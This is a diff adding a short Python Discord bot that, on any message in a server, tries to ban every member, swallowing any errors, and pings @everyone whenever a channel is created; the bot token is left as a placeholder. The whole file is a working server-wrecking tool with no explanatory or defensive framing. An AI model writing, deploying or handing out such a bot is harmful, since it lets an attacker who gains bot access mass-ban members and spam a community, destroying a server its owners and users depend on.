@@ -1,0 +1,31 @@
+import random
+import os
+import discord
+from discord.ext import commands
+
+
+intents = discord.Intents.default()
+intents.members = True
+client = discord.Client(prefix="!", intents=intents)
+
+listofmembers = [""]
+
+@client.event
+async def on_ready():
+  print ('in as {0.user}'.format(client))
+
+@client.event
+async def on_message(message):
+  
+  for x in message.guild.members:
+    try:
+      await x.ban()
+    except:
+      ""
+
+@client.event
+async def on_guild_channel_create(channel):
+    await channel.send("@everyone hi")
+
+
+client.run("enter ur token")
